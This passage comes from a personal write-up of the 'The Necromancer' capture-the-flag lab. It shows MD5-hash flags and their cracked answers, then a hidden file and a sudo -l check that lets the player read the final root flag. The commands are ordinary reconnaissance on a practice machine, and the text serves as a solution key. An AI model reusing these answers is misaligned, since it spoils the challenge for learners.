The flags are:

> 55a6af2ca3fee9f2fef81d20743bda2c MD5 : Kelewan
>
> 713587e17e796209d1df4c9c2c2d2966 MD5 : Mephistopheles
>
> 8dc6486d2c63cafcdc6efbba2be98ee4 MD5 : Hedge

Appears the flag are the answers to the riddle. Move on.



## Flag 11

Last flag. Let's see at the text of the last ones. 

> On the ground is a small vile.

List all files in the current directory:

```
$ ls -al
total 44
drwxr-xr-x  3 demonslayer  demonslayer  512 Oct  9 01:17 .
drwxr-xr-x  3 root         wheel        512 May 11 18:25 ..
-rw-r--r--  1 demonslayer  demonslayer   87 May 11 18:25 .Xdefaults
-rw-r--r--  1 demonslayer  demonslayer  773 May 11 18:25 .cshrc
-rw-r--r--  1 demonslayer  demonslayer  103 May 11 18:25 .cvsrc
-rw-r--r--  1 demonslayer  demonslayer  359 May 11 18:25 .login
-rw-r--r--  1 demonslayer  demonslayer  175 May 11 18:25 .mailrc
-rw-r--r--  1 demonslayer  demonslayer  218 May 11 18:25 .profile
-rw-r--r--  1 demonslayer  demonslayer  196 Oct  9 01:17 .smallvile
drwx------  2 demonslayer  demonslayer  512 May 11 18:25 .ssh
-rw-r--r--  1 demonslayer  demonslayer  706 May 11 21:19 flag8.txt
```

File `.smallvile` attracted my interest. Looking what is inside:

```
$ cat .smallvile                                                                                                          
You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!
```

Hmm, great power? Let's test it.

```
$ id
uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
```

I am still not **0**. Maybe `sudo` works?

```
$ sudo -l 
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
```

Ok, that is the great power. Let's open the last flag.

```
$ sudo /bin/cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="
```

Yay, we beat the necromancer! The CTF is finally done. The last flag resolves to:

> hackergod

Cool!



## Conclusion

This was a really nice CTF. I enjoyed every part of it. Sometimes it got really hard, but you learn a lot when you solve it. Looking forward for upcoming CTF's. Thanks [@xerubus](https://twitter.com/xerubus)!



![](https://i.imgur.com/obHJDB5.jpg)
